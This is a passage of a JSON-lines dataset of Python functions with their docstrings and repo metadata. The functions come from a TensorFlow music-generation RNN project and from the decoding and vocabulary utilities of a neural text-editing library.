(self.opt_op,)\n    if ret_output:\n        ops += (self.outputs,)\nelse:  # Generating (batch_size == 1)\n    # TODO: What to put for initialisation state (empty ? random ?) ?\n    # TODO: Modify use_prev\n    for i in range(self.args.sample_length):\n        if i < len(batch.inputs):\n            feed_dict[self.inputs[i]] = batch.inputs[i]\n            feed_dict[self.use_prev[i]] = False\n        else:  # Even not used, we still need to feed a placeholder\n            feed_dict[self.inputs[i]] = batch.inputs[0]  # Could be anything but we need it to be from the right shape\n            feed_dict[self.use_prev[i]] = True  # When we don't have an input, we use the previous output instead\n\n    ops += (self.outputs,)\n\n# Return one pass operator\nreturn ops, feed_dict", "path": "deepmusic\\model_old.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Return the list of the different modes\nUseful when parsing the command lines arguments\n\"\"\"\n", "func_signal": "def get_policies():\n", "code": "return [\n    Model.LearningRatePolicy.CST,\n    Model.LearningRatePolicy.STEP,\n    Model.LearningRatePolicy.EXPONENTIAL\n]", "path": "deepmusic\\model_old.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Save the predicted output songs using the given recorder\nArgs:\n    outputs (List[np.array]): The list of the predictions of the decoder\n    base_dir (str): Path were to save the outputs\n    base_name (str): filename of the output (without the extension)\n    recorders (List[Obj]): Interfaces called to convert the song into a file (ex: midi or png). The recorders\n        need to implement the method write_song (the method has to add the file extension) and the\n        method get_input_type.\n    chosen_labels (list[np.Array[batch_size, int]]): the chosen class at each timestep (useful to reconstruct the generated song)\n\"\"\"\n\n", "func_signal": "def visit_recorder(self, outputs, base_dir, base_name, recorders, chosen_labels=None):\n", "code": "if not os.path.exists(base_dir):\n    os.makedirs(base_dir)\n\nfor batch_id in range(outputs[0].shape[0]):  # Loop over batch_size\n    song = self.batch_builder.reconstruct_batch(outputs, batch_id, chosen_labels)\n    for recorder in recorders:\n        if recorder.get_input_type() == 'song':\n            input = song\n        elif recorder.get_input_type() == 'array':\n            #input = self._convert_song2array(song)\n            continue  # TODO: For now, pianoroll desactivated\n        else:\n            raise ValueError('Unknown recorder input type.'.format(recorder.get_input_type()))\n        base_path = os.path.join(base_dir, base_name + '-' + str(batch_id))\n        recorder.write_song(input, base_path)", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Prepare the batches for the current epoch\nWARNING: The songs are not shuffled in this functions. We leave the choice\nto the batch_builder to manage the shuffling\nReturn:\n    list[Batch], list[Batch]: The batches for the training and testing set (can be generators)\n\"\"\"\n", "func_signal": "def get_batches(self):\n", "code": "return (\n    self.batch_builder.get_list(self.songs_train, name='train'),\n    self.batch_builder.get_list(self.songs_test, name='test'),\n)", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Return the target weight for the given step i using the chosen policy\n\"\"\"\n", "func_signal": "def get_weight(self, i):\n", "code": "if not self.args.target_weights or self.args.target_weights == Model.TargetWeightsPolicy.NONE:\n    return 1.0\nelif self.args.target_weights == Model.TargetWeightsPolicy.LINEAR:\n    return i / (self.args.sample_length - 1)  # Gradually increment the loss weight\nelif self.args.target_weights == Model.TargetWeightsPolicy.STEP:\n    raise NotImplementedError('Step target weight policy not implemented yet, please consider another policy')\nelse:\n    raise ValueError('Unknown chosen target weight policy: {}'.format(self.args.target_weights))", "path": "deepmusic\\model_old.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Return the list of the different modes\nUseful when parsing the command lines arguments\n\"\"\"\n", "func_signal": "def get_policies():\n", "code": "return [\n    Model.TargetWeightsPolicy.NONE,\n    Model.TargetWeightsPolicy.LINEAR,\n    Model.TargetWeightsPolicy.STEP\n]", "path": "deepmusic\\model.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Create the computational graph\n\"\"\"\n", "func_signal": "def _build_network(self):\n", "code": "input_dim = ModuleLoader.batch_builders.get_module().get_input_dim()\n\n# Placeholders (Use tf.SparseTensor with training=False instead) (TODO: Try restoring dynamic batch_size)\nwith tf.name_scope('placeholder_inputs'):\n    self.inputs = [\n        tf.placeholder(\n            tf.float32,  # -1.0/1.0 ? Probably better for the sigmoid\n            [self.args.batch_size, input_dim],  # TODO: Get input size from batch_builder\n            name='input')\n        for _ in range(self.args.sample_length)\n        ]\nwith tf.name_scope('placeholder_targets'):\n    self.targets = [\n        tf.placeholder(\n            tf.int32,  # 0/1  # TODO: Int for sofmax, Float for sigmoid\n            [self.args.batch_size,],  # TODO: For softmax, only 1d, for sigmoid, 2d (batch_size, num_class)\n            name='target')\n        for _ in range(self.args.sample_length)\n        ]\nwith tf.name_scope('placeholder_use_prev'):\n    self.use_prev = [\n        tf.placeholder(\n            tf.bool,\n            [],\n            name='use_prev')\n        for _ in range(self.args.sample_length)  # The first value will never be used (always takes self.input for the first step)\n        ]\n\n# Define the network\nself.loop_processing = ModuleLoader.loop_processings.build_module(self.args)\ndef loop_rnn(prev, i):\n    \"\"\" Loop function used to connect one output of the rnn to the next input.\n    The previous input and returned value have to be from the same shape.\n    This is useful to use the same network for both training and testing.\n    Args:\n        prev: the previous predicted keyboard configuration at step i-1\n        i: the current step id (Warning: start at 1, 0 is ignored)\n    Return:\n        tf.Tensor: the input at the step i\n    \"\"\"\n    next_input = self.loop_processing(prev)\n\n    # On training, we force the correct input, on testing, we use the previous output as next input\n    return tf.cond(self.use_prev[i], lambda: next_input, lambda: self.inputs[i])\n\n# TODO: Try attention decoder/use dynamic_rnn instead\nself.outputs, self.final_state = tf.nn.seq2seq.rnn_decoder(\n    decoder_inputs=self.inputs,\n    initial_state=None,  # The initial state is defined inside KeyboardCell\n    cell=KeyboardCell(self.args),\n    loop_function=loop_rnn\n)\n\n# For training only\nif not self.args.test:\n    # Finally, we define the loss function\n\n    # The network will predict a mix a wrong and right notes. For the loss function, we would like to\n    # penalize note which are wrong. Eventually, the penalty should be less if the network predict the same\n    # note but not in the right pitch (ex: C4 instead of C5), with a decay the further the prediction\n    # is (D5 and D1 more penalized than D4 and D3 if the target is D2)\n\n    # For the piano roll mode, by using sigmoid_cross_entropy_with_logits, the task is formulated as a NB_NOTES binary\n    # classification problems\n\n    # For the relative note experiment, it use a standard SoftMax where the label is the relative position to the previous\n    # note\n\n    self.schedule_policy = Model.ScheduledSamplingPolicy(self.args)\n    self.target_weights_policy = Model.TargetWeightsPolicy(self.args)\n    self.learning_rate_policy = ModuleLoader.learning_rate_policies.build_module(self.args)  # Load the chosen policies\n\n    # TODO: If train on different length, check that the loss is proportional to the length or average ???\n    loss_fct = tf.nn.seq2seq.sequence_loss(\n        self.outputs,\n        self.targets,\n        [tf.constant(self.target_weights_policy.get_weight(i), shape=self.targets[0].get_shape()) for i in range(len(self.targets))],  # Weights\n        #softmax_loss_function=tf.nn.softmax_cross_entropy_with_logits,  # Previous: tf.nn.sigmoid_cross_entropy_with_logits TODO: Use option to choose. (new module ?)\n        average_across_timesteps=True,  # Before: I think it's best for variables length sequences (specially with the target weights=0), isn't it (it implies also that short sequences are less penalized than long ones) ? (TODO: For variables length sequences, be careful about the target weights)\n        average_across_batch=True  # Before: Penalize by sample (should allows dynamic batch size) Warning: need to tune the learning rate\n    )\n    tf.scalar_summary('training_loss', loss_fct)  # Keep track of the cost\n\n    self.current_learning_rate = tf.placeholder(tf.float32, [])\n\n    # Initialize the optimizer\n    opt = tf.train.AdamOptimizer(\n        learning_rate=self.current_learning_rate,\n        beta1=0.9,\n        beta2=0.999,\n        epsilon=1e-08\n    )\n\n    # TODO: Also keep track of magnitudes (how much is updated)\n    self.opt_op = opt.minimize(loss_fct)", "path": "deepmusic\\model.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\"Load all conversations\nArgs:\n    args: parameters of the model\n\"\"\"\n\n# Filename and directories constants\n", "func_signal": "def __init__(self, args):\n", "code": "self.DATA_VERSION = '0.2'  # Assert compatibility between versions\nself.DATA_DIR_MIDI = 'data/midi'  # Originals midi files\nself.DATA_DIR_PLAY = 'data/play'  # Target folder to show the reconstructed files\nself.DATA_DIR_SAMPLES = 'data/samples'  # Training/testing samples after pre-processing\nself.DATA_SAMPLES_RAW = 'raw'  # Unpreprocessed songs container tag\nself.DATA_SAMPLES_EXT = '.pkl'\nself.TEST_INIT_FILE = 'data/test/initiator.json'  # Initial input for the generated songs\nself.FILE_EXT = '.mid'  # Could eventually add support for other format later ?\n\n# Model parameters\nself.args = args\n\n# Dataset\nself.songs = []\nself.songs_train = None\nself.songs_test = None\n\n# TODO: Dynamic loading of the the associated dataset flag (ex: data/samples/pianoroll/...)\nself.batch_builder = ModuleLoader.batch_builders.build_module(args)\n\nif not self.args.test:  # No need to load the dataset when testing\n    self._restore_dataset()\n\n    if self.args.play_dataset:\n        print('Play some songs from the formatted data')\n        # Generate songs\n        for i in range(min(10, len(self.songs))):\n            raw_song = self.batch_builder.reconstruct_song(self.songs[i])\n            MidiConnector.write_song(raw_song, os.path.join(self.DATA_DIR_PLAY, str(i)))\n        # TODO: Display some images corresponding to the loaded songs\n        raise NotImplementedError('Can\\'t play a song for now')\n\n    self._split_dataset()  # Warning: the list order will determine the train/test sets (so important that it don't change from run to run)\n\n    # Plot some stats:\n    print('Loaded: {} songs ({} train/{} test)'.format(\n        len(self.songs_train) + len(self.songs_test),\n        len(self.songs_train),\n        len(self.songs_test))\n    )  # TODO: Print average, max, min duration", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Create the computational graph\n\"\"\"\n\n# Placeholders (Use tf.SparseTensor with training=False instead) (TODO: Try restoring dynamic batch_size)\n", "func_signal": "def _build_network(self):\n", "code": "with tf.name_scope('placeholder_inputs'):\n    self.inputs = [\n        tf.placeholder(\n            tf.float32,  # -1.0/1.0 ? Probably better for the sigmoid\n            [self.args.batch_size, music.NB_NOTES],\n            name='input')\n        for _ in range(self.args.sample_length)\n        ]\nwith tf.name_scope('placeholder_targets'):\n    self.targets = [\n        tf.placeholder(\n            tf.float32,  # 0/1\n            [self.args.batch_size, music.NB_NOTES],\n            name='target')\n        for _ in range(self.args.sample_length)\n        ]\nwith tf.name_scope('placeholder_use_prev'):\n    self.use_prev = [\n        tf.placeholder(\n            tf.bool,\n            [],\n            name='use_prev')\n        for _ in range(self.args.sample_length)  # The first value will never be used (always takes self.input for the first step)\n        ]\n\n# Projection on the keyboard\nwith tf.name_scope('note_projection_weights'):\n    W = tf.Variable(\n        tf.truncated_normal([self.args.hidden_size, music.NB_NOTES]),\n        name='weights'\n    )\n    b = tf.Variable(\n        tf.truncated_normal([music.NB_NOTES]),  # Tune the initializer ?\n        name='bias',\n    )\n\ndef project_note(X):\n    with tf.name_scope('note_projection'):\n        return tf.matmul(X, W) + b  # [batch_size, NB_NOTE]\n\n# RNN network\nrnn_cell = tf.nn.rnn_cell.BasicLSTMCell(self.args.hidden_size, state_is_tuple=True)  # Or GRUCell, LSTMCell(args.hidden_size)\n#rnn_cell = tf.nn.rnn_cell.DropoutWrapper(rnn_cell, input_keep_prob=1.0, output_keep_prob=1.0)  # TODO: Custom values (WARNING: No dropout when testing !!!, possible to use placeholder ?)\nrnn_cell = tf.nn.rnn_cell.MultiRNNCell([rnn_cell] * self.args.num_layers, state_is_tuple=True)\n\ninitial_state = rnn_cell.zero_state(batch_size=self.args.batch_size, dtype=tf.float32)\n\ndef loop_rnn(prev, i):\n    \"\"\" Loop function used to connect one output of the rnn to the next input.\n    Will re-adapt the output shape to the input one.\n    This is useful to use the same network for both training and testing. Warning: Because of the fixed\n    batch size, we have to predict batch_size sequences when testing.\n    \"\"\"\n    # Predict the output from prev and scale the result on [-1, 1]\n    next_input = project_note(prev)\n    next_input = tf.sub(tf.mul(2.0, tf.nn.sigmoid(next_input)), 1.0)  # x_{i} = 2*sigmoid(y_{i-1}) - 1\n\n    # On training, we force the correct input, on testing, we use the previous output as next input\n    return tf.cond(self.use_prev[i], lambda: next_input, lambda: self.inputs[i])\n\n(outputs, self.final_state) = tf.nn.seq2seq.rnn_decoder(\n    decoder_inputs=self.inputs,\n    initial_state=initial_state,\n    cell=rnn_cell,\n    loop_function=loop_rnn\n)\n\n# Final projection\nwith tf.name_scope('final_output'):\n    self.outputs = []\n    for output in outputs:\n        proj = project_note(output)\n        self.outputs.append(proj)\n\n# For training only\nif not self.args.test:\n    # Finally, we define the loss function\n\n    # The network will predict a mix a wrong and right notes. For the loss function, we would like to\n    # penalize note which are wrong. Eventually, the penalty should be less if the network predict the same\n    # note but not in the right pitch (ex: C4 instead of C5), with a decay the further the prediction\n    # is (D5 and D1 more penalized than D4 and D3 if the target is D2)\n\n    # For now, by using sigmoid_cross_entropy_with_logits, the task is formulated as a NB_NOTES binary\n    # classification problems\n\n    self.schedule_policy = Model.ScheduledSamplingPolicy(self.args)\n    self.target_weights_policy = Model.TargetWeightsPolicy(self.args)\n    self.learning_rate_policy = Model.LearningRatePolicy(self.args)  # Load the chosen policies\n\n    # TODO: If train on different length, check that the loss is proportional to the length or average ???\n    loss_fct = tf.nn.seq2seq.sequence_loss(\n        self.outputs,\n        self.targets,\n        [tf.constant(self.target_weights_policy.get_weight(i), shape=self.targets[0].get_shape()) for i in range(len(self.targets))],  # Weights\n        softmax_loss_function=tf.nn.sigmoid_cross_entropy_with_logits,\n        average_across_timesteps=False,  # I think it's best for variables length sequences (specially with the target weights=0), isn't it (it implies also that short sequences are less penalized than long ones) ? (TODO: For variables length sequences, be careful about the target weights)\n        average_across_batch=False  # Penalize by sample (should allows dynamic batch size) Warning: need to tune the learning rate\n    )\n    tf.scalar_summary('training_loss', loss_fct)  # Keep track of the cost\n\n    self.current_learning_rate = tf.placeholder(tf.float32, [])\n\n    # Initialize the optimizer\n    opt = tf.train.AdamOptimizer(\n        learning_rate=self.current_learning_rate,\n        beta1=0.9,\n        beta2=0.999,\n        epsilon=1e-08\n    )\n\n    # TODO: Also keep track of magnitudes (how much is updated)\n    self.opt_op = opt.minimize(loss_fct)", "path": "deepmusic\\model_old.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Load samples from file\nArgs:\n    samples_path (str): The path where to load the model (all dirs should exist)\nReturn:\n    List[Song]: The training data\n\"\"\"\n", "func_signal": "def _restore_samples(self, samples_path):\n", "code": "with open(samples_path, 'rb') as handle:\n    data = pickle.load(handle)  # Warning: If adding something here, also modifying saveDataset\n\n    # Check the version\n    current_version = data['version']\n    if current_version != self.DATA_VERSION:\n        raise UserWarning('Present configuration version {0} does not match {1}.'.format(current_version, self.DATA_VERSION))\n\n    # Restore parameters\n    self.songs = data['songs']", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Create the test/train set from the loaded songs\nThe dataset has been shuffled when calling this function (Warning: the shuffling\nis done and fixed before saving the dataset the first time so it is important to\nNOT call shuffle a second time)\n\"\"\"\n", "func_signal": "def _split_dataset(self):\n", "code": "split_nb = int(self.args.ratio_dataset * len(self.songs))\nself.songs_train = self.songs[:split_nb]\nself.songs_test = self.songs[split_nb:]\nself.songs = None  # Not needed anymore (free some memory)", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Forward/training step operation.\nDoes not perform run on itself but just return the operators to do so. Those have then to be run by the\nmain program.\nIf the output operator is returned, it will always be the last one on the list\nArgs:\n    batch (Batch): Input data on testing mode, input and target on output mode\n    train_set (Bool): indicate if the batch come from the test/train set (not used when generating)\n    glob_step (int): indicate the global step for the schedule sampling\n    ret_output (Bool): for the training mode, if true,\nReturn:\n    Tuple[ops], dict: The list of the operators to run (training_step or outputs) with the associated feed dictionary\n\"\"\"\n# TODO: Could optimize feeding between train/test/generating (compress code)\n\n", "func_signal": "def step(self, batch, train_set=True, glob_step=-1, ret_output=False):\n", "code": "feed_dict = {}\nops = ()  # For small length, it seems (from my investigations) that tuples are faster than list for merging\nbatch.generate(target=False if self.args.test else True)\n\n# Feed placeholders and choose the ops\nif not self.args.test:  # Training\n    if train_set:  # We update the learning rate every x iterations # TODO: What happens when we don't feed the learning rate ??? Stays at the last value ?\n        assert glob_step >= 0\n        feed_dict[self.current_learning_rate] = self.learning_rate_policy.get_learning_rate(glob_step)\n\n    for i in range(self.args.sample_length):\n        feed_dict[self.inputs[i]] = batch.inputs[i]\n        feed_dict[self.targets[i]] = batch.targets[i]\n        #if np.random.rand() >= self.schedule_policy.get_prev_threshold(glob_step)*self.target_weights_policy.get_weight(i):  # Regular Schedule sample (TODO: Try sampling with the weigths or a mix of weights/sampling)\n        if np.random.rand() >= self.schedule_policy.get_prev_threshold(glob_step):  # Weight the threshold by the target weights (don't schedule sample if weight=0)\n            feed_dict[self.use_prev[i]] = True\n        else:\n            feed_dict[self.use_prev[i]] = False\n\n    if train_set:\n        ops += (self.opt_op,)\n    if ret_output:\n        ops += (self.outputs,)\nelse:  # Generating (batch_size == 1)\n    # TODO: What to put for initialisation state (empty ? random ?) ?\n    # TODO: Modify use_prev\n    for i in range(self.args.sample_length):\n        if i < len(batch.inputs):\n            feed_dict[self.inputs[i]] = batch.inputs[i]\n            feed_dict[self.use_prev[i]] = False\n        else:  # Even not used, we still need to feed a placeholder\n            feed_dict[self.inputs[i]] = batch.inputs[0]  # Could be anything but we need it to be from the right shape\n            feed_dict[self.use_prev[i]] = True  # When we don't have an input, we use the previous output instead\n\n    ops += (self.loop_processing.get_op(), self.outputs,)  # The loop_processing operator correspond to the recorded softmax sampled\n\n# Return one pass operator\nreturn ops, feed_dict", "path": "deepmusic\\model.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Single layer perceptron\nProject X on the output dimension\nArgs:\n    shape: a tuple (input dim, output dim)\n    scope_name (str): encapsulate variables\nReturn:\n    tf.Ops: The projection operator (see project_fct())\n\"\"\"\n", "func_signal": "def single_layer_perceptron(shape, scope_name):\n", "code": "assert len(shape) == 2\n\n# Projection on the keyboard\nwith tf.variable_scope('weights_' + scope_name):\n    W = tf.get_variable(\n        'weights',\n        shape,\n        initializer=tf.truncated_normal_initializer()  # TODO: Tune value (fct of input size: 1/sqrt(input_dim))\n    )\n    b = tf.get_variable(\n        'bias',\n        shape[1],\n        initializer=tf.constant_initializer()\n    )\n\ndef project_fct(X):\n    \"\"\" Project the output of the decoder into the note space\n    Args:\n        X (tf.Tensor): input value\n    \"\"\"\n    # TODO: Could we add an activation function as option ?\n    with tf.name_scope(scope_name):\n        return tf.matmul(X, W) + b\n\nreturn project_fct", "path": "deepmusic\\tfutils.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\" Create songs from the decoder outputs.\nReshape the list of outputs to list of piano rolls\nArgs:\n    outputs (List[np.array]): The list of the predictions of the decoder\nReturn:\n    List[np.array]: the list of the songs (one song by batch) as piano roll\n\"\"\"\n\n# Extract the batches and recreate the array for each batch\n", "func_signal": "def _convert_to_piano_rolls(outputs):\n", "code": "piano_rolls = []\nfor i in range(outputs[0].shape[0]):  # Iterate over the batches\n    piano_roll = None\n    for j in range(len(outputs)):  # Iterate over the sample length\n        # outputs[j][i, :] has shape [NB_NOTES, 1]\n        if piano_roll is None:\n            piano_roll = [outputs[j][i, :]]\n        else:\n            piano_roll = np.append(piano_roll, [outputs[j][i, :]], axis=0)\n    piano_rolls.append(piano_roll.T)\n\nreturn piano_rolls", "path": "deepmusic\\musicdata.py", "repo_name": "Conchylicultor/MusicGenerator", "stars": 304, "license": "apache-2.0", "language": "python", "size": 263}
{"docstring": "\"\"\"Set Matplotlib backend to 'Agg', which is necessary on CodaLab docker image.\"\"\"\n", "func_signal": "def configure_matplotlib():\n", "code": "import warnings\nimport matplotlib\nwith warnings.catch_warnings():\n    warnings.simplefilter('ignore')\n    matplotlib.use('Agg')  # needed when running from server", "path": "third-party\\gtd\\gtd\\codalab.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Construct BeamDecoder.\n\nArgs:\n    decoder_cell (DecoderCell)\n    token_embedder (TokenEmbedder)\n    rnn_context_combiner (RNNContextCombiner)\n\n\"\"\"\n", "func_signal": "def __init__(self, decoder_cell, token_embedder, rnn_context_combiner):\n", "code": "self.decoder_cell = decoder_cell\nself.word_vocab = token_embedder.vocab\nself.token_embedder = token_embedder\nself.word_dim = token_embedder.embed_dim\nself.rnn_context_combiner = rnn_context_combiner", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Return the sequence of tokens encountered on the path to this DecoderState.\n\n<start> and <stop> are stripped from the sequence.\n\nReturns:\n    list[unicode]\n\"\"\"\n", "func_signal": "def token_sequence(self):\n", "code": "tokens = [s.token for s in self.sequence]\n\n# trim off start and stop\nstart_idx, end_idx = 0, len(tokens)\nif tokens[0] == START:\n    start_idx += 1\nif tokens[-1] == STOP:\n    end_idx -= 1\n\nreturn tokens[start_idx:end_idx]", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Sample an output. \n\nArgs:\n    examples (list[Example])\n    encoder_output (EncoderOutput)\n    beam_size (int)\n    prefix_hints (list[list[unicode]]): a batch of prefixes. For each example, all returned results will start\n        with the specified prefix.\n    max_seq_length (int): maximum allowable length of outputted sequences\n    top_k (int): number of beam candidates to show in trace\n    temperature (float): sampling temperature\n\nReturns:\n    beams (list[list[list[unicode]]]): a batch of beams of decoded sequences\n    traces (list[PredictionTrace])\n\"\"\"\n", "func_signal": "def decode(self, examples, encoder_output, beam_size, prefix_hints, max_seq_length=50, top_k=5, temperature=1.):\n", "code": "rnn_state_orig, states_orig = self._initialize(self.decoder_cell, examples)\n\n# duplicate everything to beam_size\nduplicate = BeamDuplicator(beam_size)\nrnn_state = duplicate(rnn_state_orig)\nencoder_output = duplicate(encoder_output)\nstates = []\nfor state in states_orig:\n    states.extend([state] * beam_size)\n\nstates_over_time = []\nfor t in range(max_seq_length):\n    # stop if all sequences have terminated\n    if all(state.terminated for state in states): break\n    hints_at_t = self._prefix_hints_at_time_t(prefix_hints, t, beam_size)\n    rnn_state, states = self._advance(encoder_output, rnn_state, states, hints_at_t, temperature)\n    states_over_time.append(states)\n\nreturn self._recover_sequences(states_over_time, beam_size, top_k=top_k)", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Penalize extensions by their rank, as done in Li et al. 2016.\n\n\"A Simple, Fast Diverse Decoding Algorithm for Neural Generation.\"\n\nArgs:\n    extension_probs (np.ndarray): of shape (batch_size, vocab_size)\n    penalty (float)\n\"\"\"\n", "func_signal": "def penalize_extensions_by_rank(cls, extension_probs, penalty):\n", "code": "batch_size, vocab_size = extension_probs.shape\npenalized_extension_probs = np.copy(extension_probs)\n\nif penalty == 0.0:\n    return penalized_extension_probs  # shortcut for when there is no penalty\n\ntop_indices = np.argsort(-extension_probs, axis=1)\nj_indices, i_indices = np.meshgrid(np.arange(vocab_size), np.arange(batch_size))\npenalized_extension_probs[i_indices, top_indices] /= np.exp(penalty * j_indices)\nreturn penalized_extension_probs", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Initialize RNN and decoder states.\n\nArgs:\n    decoder_cell (DecoderCell)\n    examples (list[Example])\n\nReturns:\n    rnn_state (RNNState)\n    states (list[DecoderState])\n\"\"\"\n", "func_signal": "def _initialize(cls, decoder_cell, examples):\n", "code": "states = [DecoderState.initial(ex) for ex in examples]\nbatch_size = len(examples)\nrnn_state = decoder_cell.initialize(batch_size)\n# TODO: make hidden states volatile\n\nreturn rnn_state, states", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Take one step of beam search.\n\nArgs:\n    encoder_output (EncoderOutput)\n    weighted_value_estimators (list[(ValueEstimator, float)]): a list of (estimator, weight) pairs.\n    beam_size (int)\n    rnn_state (RNNState)\n    states (list[DecoderState])\n    sibling_penalty (float)\n\nReturns:\n    h (Variable): (batch_size, hidden_dim)\n    c (Variable): (batch_size, hidden_dim)\n    states (list[DecoderState])\n\"\"\"\n", "func_signal": "def _advance(self, encoder_output, weighted_value_estimators, beam_size, rnn_state, states, sibling_penalty):\n", "code": "rnn_state, predictions = self._advance_rnn(self.token_embedder, self.decoder_cell, self.rnn_context_combiner,\n                                           encoder_output, rnn_state, states)\ntoken_probs, vocab = predictions\n\nsequence_probs = np.expand_dims(np.array([s.sequence_prob for s in states]), 1)  # (batch_size, 1)\nextension_probs = sequence_probs * token_probs  # (batch_size, vocab_size)\n\n# modify extension probs using value estimators\nmodified_extension_probs = np.copy(extension_probs)\nfor val_estimator, weight in weighted_value_estimators:\n    modified_extension_probs *= np.exp(weight * val_estimator.value(states, rnn_state))\n\n# apply diversity-inducing sibling penalization trick\nmodified_extension_probs = self.penalize_extensions_by_rank(modified_extension_probs, sibling_penalty)\n\n# select the best extensions of each beam, using MODIFIED extension_probs\nbatch_indices, token_indices = self._select_extensions_fast(modified_extension_probs, beam_size)\n# both batch_indices and token_indices are (batch_size,)\n\n# select surviving RNN states\nbatch_selector = BatchSelector(batch_indices)\nrnn_state = batch_selector(rnn_state)\n\n# update states\n# note that here we store the original, UN-MODIFIED extension_probs\n# these are actual generation probabilities\nnew_states = []\nfor batch_idx, token_idx in izip(batch_indices, token_indices):\n    state = states[batch_idx]\n    if state.terminated:\n        new_state = state\n    else:\n        token = vocab.index2word(token_idx)\n        extension_prob = extension_probs[batch_idx, token_idx]\n\n        # construct trace\n        token_prob = token_probs[batch_idx, token_idx]\n        candidates = [Candidate(token, token_prob)]\n        trace = PredictionTrace(candidates, [])\n        # TODO(kelvin): add more info to trace\n\n        new_state = state.extend(token, extension_prob, trace)\n\n    new_states.append(new_state)\n\nreturn rnn_state, new_states", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"Return a new SimpleEmbeddings object with special tokens inserted at the front of the vocab.\n\nIn the new vocab, special tokens will occupy indices 0, 1, ..., len(special_tokens) - 1.\nThe special tokens will have randomly generated embeddings.\n\nArgs:\n    random_seed (int)\n\nReturns:\n    SimpleEmbeddings\n\"\"\"\n", "func_signal": "def with_special_tokens(self, random_seed=0):\n", "code": "special_tokens = list(WordVocab.SPECIAL_TOKENS)\n_, embed_dim = self.array.shape\nspecial_tokens_array_shape = (len(special_tokens), embed_dim)\nspecial_tokens_array = emulate_distribution(special_tokens_array_shape, self.array, seed=random_seed)\nspecial_tokens_array = special_tokens_array.astype(np.float32)\n\nnew_array = np.concatenate((special_tokens_array, self.array), axis=0)\nnew_vocab = WordVocab(special_tokens + self.vocab.tokens)\n\nreturn SimpleEmbeddings(new_array, new_vocab)", "path": "third-party\\gtd\\gtd\\ml\\vocab.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
{"docstring": "\"\"\"\n\nArgs:\n    encoder_output (EncoderOutput)\n    rnn_state (RNNState)\n    states (list[DecoderState]) \n    hints_at_t (list[unicode]): of length = len(states)\n    temperature (float)\n\nReturns:\n    rnn_state (RNNState)\n    states (list[DecoderState])\n\"\"\"\n# update RNN state\n", "func_signal": "def _advance(self, encoder_output, rnn_state, states, hints_at_t, temperature):\n", "code": "rnn_state, predictions = self._advance_rnn(self.token_embedder, self.decoder_cell, self.rnn_context_combiner,\n                                           encoder_output, rnn_state, states)\ntoken_probs, vocab = predictions\nvocab_size = len(vocab)\n\n# update states\nnew_states = []\nfor batch_idx, (state, hint) in enumerate(izip(states, hints_at_t)):\n    if state.terminated:\n        new_state = state\n    else:\n        if hint is None:\n            sampling_probs = token_probs[batch_idx]  # np.array (vocab_size,)\n            sampling_probs = temperature_smooth(sampling_probs, temperature)\n            token_idx = np.random.choice(vocab_size, p=sampling_probs)  # select token according to prob\n        else:\n            token_idx = vocab.word2index(hint)  # follow the hint\n        token = vocab.index2word(token_idx)\n        token_prob = token_probs[batch_idx, token_idx]\n        extension_prob = state.sequence_prob * token_prob  # compute prob of entire new sequence\n\n        candidates = [Candidate(token, token_prob)]\n        trace = PredictionTrace(candidates, [])\n        new_state = state.extend(token, extension_prob, trace)\n\n    new_states.append(new_state)\n\nreturn rnn_state, new_states", "path": "third-party\\gtd\\gtd\\ml\\torch\\decoder.py", "repo_name": "kelvinguu/neural-editor", "stars": 327, "license": "None", "language": "python", "size": 172}
